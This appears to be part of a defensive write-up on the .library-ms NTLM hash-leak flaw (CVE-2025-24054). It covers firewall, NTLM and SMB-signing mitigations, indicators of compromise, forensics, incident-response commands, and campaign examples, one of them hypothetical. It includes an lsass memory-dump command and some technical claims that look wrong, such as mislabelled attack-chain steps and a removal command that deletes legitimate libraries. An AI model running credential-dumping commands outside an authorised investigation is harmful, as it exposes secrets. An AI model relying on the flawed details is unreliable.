**Applies To Versions:** All Windows versions (network-level mitigation)

**Manual Steps (Firewall - Windows Defender Firewall):**
1. Open **Windows Defender Firewall** → **Advanced Security**
2. Click **Outbound Rules** → **New Rule**
3. **Rule Type:** Select **Port**
4. **Protocol and Ports:** 
   - Protocol: **TCP**
   - Remote Port: **445, 139**
5. **Action:** **Block**
6. **Profile:** Check all (Domain, Private, Public)
7. **Name:** `Block SMB Outbound to External`
8. Click **Finish**

**Manual Steps (Network Firewall - Palo Alto / Fortinet / Cisco):**
```
# Example: Palo Alto Networks
Object → Service → Create New
  Name: "SMB-Outbound"
  Protocol: TCP
  Port: 445, 139

Policy → Outbound
  Source: Internal_Subnets
  Destination: External/Internet
  Service: SMB-Outbound
  Action: Deny
```

**Manual Steps (Group Policy - Enterprise):**
1. Open **gpmc.msc**
2. **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Windows Firewall with Advanced Security** → **Outbound Rules**
3. **New Rule** → **Port** → **TCP** → **Specific Port: 445, 139**
4. **Action:** **Block**
5. Apply GPO to all domain computers

**Validation Command (Verify Fix):**
```powershell
# Check if outbound SMB is blocked
Get-NetFirewallRule -DisplayName "*SMB*" | Where-Object {$_.Direction -eq "Outbound"} | Select-Object DisplayName, Enabled, Direction, Action
```

**Expected Output (If Secure):**
```
DisplayName            Enabled Direction Action
-----------            ------- --------- ------
Block SMB Outbound         True  Outbound   Block
```

**What to Look For:**
- Rule is enabled and set to Block
- No exceptions for SMB ports to external IPs
- Test by attempting `net use \\external.ip\share` (should fail)

---

**Mitigation 3: Disable NTLM Authentication (Enterprise-Wide)**

**Objective:** Remove NTLM as an authentication option; force Kerberos. This eliminates the hash entirely.

**Applies To Versions:** Server 2016-2025 (when Kerberos is available)

**Prerequisites:**
- Active Directory infrastructure in place
- All systems joined to domain
- Service accounts have SPN records registered
- Extended Key Usage (EKU) certificates available (for Kerberos alternatives)

**Manual Steps (Group Policy - Disable NTLM):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Find **"Network security: Restrict NTLM: NTLM authentication in this domain"**
4. Set to **"Deny for non-DC servers"** or **"Deny all"**
5. Run `gpupdate /force`

**Manual Steps (Registry - Direct Configuration):**
```powershell
# Set to deny NTLM (registry level)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictNTLMInDomain" -Value 4 -Type DWORD

# Restart required
Restart-Computer
```

**Impact Assessment:**
- Legacy applications may break (require Kerberos support)
- Test in development environment first
- Gradual rollout recommended (test servers → domain → entire enterprise)

**Validation Command (Verify Fix):**
```powershell
# Check if NTLM is disabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictNTLMInDomain"

# Expected output:
# RestrictNTLMInDomain : 4 (deny all NTLM)
```

---

### Priority 2: HIGH

**Mitigation 4: Enforce SMB Signing**

**Objective:** Cryptographically sign all SMB messages. This prevents relay attacks even if hash is captured.

**Manual Steps (Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Local Policies** → **Security Options**
3. Find **"Microsoft network client: Digitally sign communications (always)"**
4. Set to **"Enabled"**
5. Find **"Microsoft network server: Digitally sign communications (if client agrees)"**
6. Set to **"Enabled"**
7. Run `gpupdate /force`

**Manual Steps (Registry):**
```powershell
# Enable SMB signing
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1 -Type DWORD
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1 -Type DWORD

Restart-Computer
```

**Validation Command (Verify Fix):**
```powershell
# Check if SMB signing is enabled
Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" | Select-Object RequireSecuritySignature, EnableSecuritySignature
```

**Expected Output (If Secure):**
```
RequireSecuritySignature : 1
EnableSecuritySignature  : 1
```

---

**Mitigation 5: Restrict File Explorer Behavior (Disable .library-ms Processing)**

**Objective:** Prevent Windows Explorer from automatically processing `.library-ms` files.

**Manual Steps (Registry - Disable Library Files):**
```powershell
# Disable library file handling
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v DisableLibraryItemLaunch /t REG_DWORD /d 1 /f

# Restart Explorer or reboot
Stop-Process -Name explorer -Force
Start-Process explorer
```

**Manual Steps (Remove .library-ms File Association):**
```powershell
# Remove .library-ms file type association
Remove-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.library-ms" -Force -ErrorAction SilentlyContinue
```

**Validation Command (Verify Fix):**
```powershell
# Check if library file handling is disabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "DisableLibraryItemLaunch" -ErrorAction SilentlyContinue
```

---

### Priority 3: MEDIUM

**Mitigation 6: User Awareness & Email Gateway Controls**

**Objective:** Train users to recognize phishing attempts and block malicious files at email gateway.

**Manual Steps (Email Security):**
1. Configure **Advanced Threat Protection (ATP)** / **Email filtering** to:
   - Block `.library-ms` file attachments
   - Scan ZIP archives for suspicious files
   - Disable automatic extraction of ZIP contents
2. Example (Exchange Online/O365):
   ```powershell
   # Block .library-ms attachment
   New-TransportRule -Name "Block library-ms" -AttachmentHasExecutableContent $true -RejectMessageReasonText "Suspicious file type"
   ```

**Manual Steps (Endpoint Detection & Response):**
1. Configure EDR solution to:
   - Alert on `.library-ms` file creation/modification
   - Block execution of unsigned `.library-ms` files
   - Monitor for SMB connections initiated by explorer.exe to external IPs

---

## 15. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Files:**
- Any `.library-ms` file created outside `C:\Windows\System32\Libraries\` (legitimate library location)
- Suspicious naming: `Info.doc.library-ms`, `Report.xls.library-ms`, `Summary.pdf.library-ms`
- Files in user Downloads, Desktop, Temp folders

**Registry:**
- HKCU/HKLM modifications to file type associations for `.library-ms`
- Disabled NTLM security policies (if malicious actor modifies to enable attacks)

**Network:**
- Outbound SMB (TCP 445, 139, UDP 137-138) to external/non-corporate IPs
- Repeated SMB connection attempts from explorer.exe to same external IP
- NTLM authentication from internal workstations to external servers

### Forensic Artifacts

**Disk:**
- Malicious `.library-ms` file on disk (compare against whitelist of legitimate libraries)
- Download location: `C:\Users\[Username]\Downloads\`, `C:\Users\[Username]\AppData\Local\Temp\`
- Recycle Bin: Deleted `.library-ms` files may be recoverable

**Memory:**
- Explorer.exe process memory may contain network connection history
- Captured NTLM credential material in SMB server logs (Responder/Inveigh)

**Cloud:**
- Microsoft Sentinel: DeviceNetworkEvents, DeviceFileEvents logs
- Microsoft Defender for Endpoint: Device timeline shows explorer.exe → SMB connection
- OneDrive/Dropbox logs: Download history of ZIP/`.library-ms` file

**MFT/USN Journal:**
- File creation timestamps
- File deletion records
- Parent directory enumeration activity

### Response Procedures

**1. Isolate Affected System**

**Command (Immediate Network Isolation):**
```powershell
# Disable network adapter
Disable-NetAdapter -Name "Ethernet" -Confirm:$false

# Alternative: Block at firewall
New-NetFirewallRule -DisplayName "Isolate Machine" -Direction Outbound -Action Block
```

**Manual (Azure / Cloud VM):**
- Go to **Azure Portal** → **Virtual Machines** → Select VM
- Click **Networking** → **Disable** all network interfaces
- Or update NSG (Network Security Group) to deny all outbound

**Notification:**
- Inform SOC/CIRT
- Notify user that system is under investigation
- Preserve system for forensics

---

**2. Collect Evidence**

**Command (Export Security Event Log):**
```powershell
# Export full Security log for forensic analysis
wevtutil epl Security C:\Evidence\Security.evtx

# Export Sysmon events (if available)
wevtutil epl "Microsoft-Windows-Sysmon/Operational" C:\Evidence\Sysmon.evtx

# Export Application log
wevtutil epl Application C:\Evidence\Application.evtx
```

**Command (Capture Memory Dump):**
```powershell
# Capture lsass.exe memory (contains credential material)
procdump64.exe -accepteula -ma lsass.exe C:\Evidence\lsass.dmp

# Capture explorer.exe memory
procdump64.exe -accepteula -ma explorer.exe C:\Evidence\explorer.dmp
```

**Manual (Event Viewer):**
1. Open **Event Viewer**
2. Right-click **Security** log
3. Click **Save All Events As**
4. Save to: `C:\Evidence\Security.evtx`

**Chain of Custody:**
- Hash all evidence files (SHA256)
- Document collection timestamp
- Store in write-protected location
- Maintain log of who accessed evidence

---

**3. Remediate**

**Command (Remove Malicious .library-ms):**
```powershell
# Find and remove .library-ms files
Get-ChildItem -Path "C:\Users" -Recurse -Filter "*.library-ms" -Force | Remove-Item -Force

# Check Downloads folder specifically
Remove-Item -Path "C:\Users\*\Downloads\*.library-ms" -Force -ErrorAction SilentlyContinue
```

**Command (Reset User Credentials):**
```powershell
# Force password change for affected user
Set-ADUser -Identity "john.doe" -ChangePasswordAtLogon $true

# Kick off all existing sessions
Revoke-ADUserLogonSession -Identity "john.doe"
```

**Command (Review and Revoke Relay Attacks):**
```powershell
# Check for NTLM relay attempts on servers
Get-EventLog -LogName Security -InstanceId 4624 -Newest 10000 | Where-Object {$_.Message -like "*192.168.1.*"}
```

---

**4. Post-Incident Assessment**

**Check if Lateral Movement Occurred:**
```powershell
# Search for logons from captured user account to other systems
Get-EventLog -LogName Security -InstanceId 4624 | Where-Object {$_.Message -like "*john.doe*" -and $_.TimeGenerated -gt (Get-Date).AddDays(-7)}

# Check for suspicious process creation by affected account
Get-EventLog -LogName Security -InstanceId 4688 | Where-Object {$_.Message -like "*john.doe*"}
```

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-PHISH-001] Device Code Phishing | Attacker sends phishing email with malicious link/attachment |
| **2** | **Initial Access** | [IA-PHISH-005] Internal Spearphishing | Attacker sends email from compromised internal account |
| **3** | **Credential Access** | **[CA-FORCE-002]** | **Malicious .library-ms file triggers NTLM hash leakage** |
| **4** | **Credential Access** | [CA-BRUTE-001] Azure Portal Password Spray | Attacker attempts to crack captured hash or spray against portal |
| **5** | **Lateral Movement** | [LM-AUTH-002] Pass-the-Ticket | Attacker uses captured NTLM hash for relay attack |
| **6** | **Privilege Escalation** | [PE-VALID-002] Computer Account Quota Abuse | Attacker abuses relayed access to create new computer accounts |
| **7** | **Impact** | Domain compromise, ransomware deployment | Full environment compromise |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: Check Point Research Campaign (March 2025)

- **Target:** Polish and Romanian government institutions, financial organizations
- **Timeline:** March 19-31, 2025 (first wave); March 25+ (second wave without ZIP)
- **Technique Status:** CVE-2025-24054 actively exploited in coordinated phishing campaigns with 10+ variants
- **Attack Vector:** 
  - ZIP files hosted on Dropbox with malicious `.library-ms`
  - Email subject: Official compliance/audit-related documents
  - Later campaigns: Direct `.library-ms` attachment (`Info.doc.library-ms`)
- **Infrastructure:** Malicious SMB servers hosted in Russia (194.127.179.157), Bulgaria, Netherlands, Australia, Turkey
- **Impact:** 
  - NTLMv2 hashes captured from government employees and financial staff
  - Lateral movement to domain controllers
  - Estimated hundreds of organizations targeted
- **Detection:** Check Point sensors detected within 2 weeks of patch release
- **Reference:** [Check Point Research - CVE-2025-24054](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)

### Example 2: Phishing Campaign - "Q4 Compliance Report" (Generic)

- **Target:** Mid-sized enterprise (500-2000 employees)
- **Timeline:** January 2025 (pre-discovery); March 2025 (active exploitation)
- **Technique Status:** Variant using `.library-ms` within ZIP; unpatched systems (Server 2019 Build 17763.5000)
- **Attack Method:**
  1. Attacker sends phishing email with subject "Q4 Compliance Audit Results"
  2. Victim downloads `Compliance_Report.zip` from attacker-hosted Dropbox link
  3. Victim extracts ZIP to local folder
  4. Windows Explorer automatically processes `.library-ms` file inside
  5. NTLM hash of Domain Admin captured on attacker server
  6. Attacker relays hash to file server (SMB)
  7. Full file share access granted to attacker
  8. Exfiltration of financial records, customer data
- **Impact:** 
  - Data breach (10GB+ exfiltrated)
  - Ransomware deployment on 50+ servers
  - Ransom demand $500,000
  - Regulatory fines (GDPR, state laws)
- **Remediation:** Applied KB5036427, disabled NTLM, reset all domain accounts
- **Reference:** Hypothetical based on real campaign patterns

---

